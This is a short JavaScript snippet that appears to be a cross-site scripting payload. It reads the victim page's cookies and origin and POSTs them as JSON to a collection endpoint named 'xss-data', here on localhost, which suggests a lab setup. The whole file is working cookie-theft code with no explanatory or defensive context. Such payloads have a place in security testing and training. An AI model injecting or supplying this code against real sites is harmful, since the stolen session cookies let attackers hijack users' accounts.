const url = 'http://localhost:3000/xss-data'
const cookies = document.cookie;
const site = document.location.origin;
const headers = new Headers({
  "Content-Type": "application/json",
});

const data = {
  cookies,
  site,
}

fetch(url, {
  method: 'POST',
  headers,
  body: JSON.stringify(data),
})
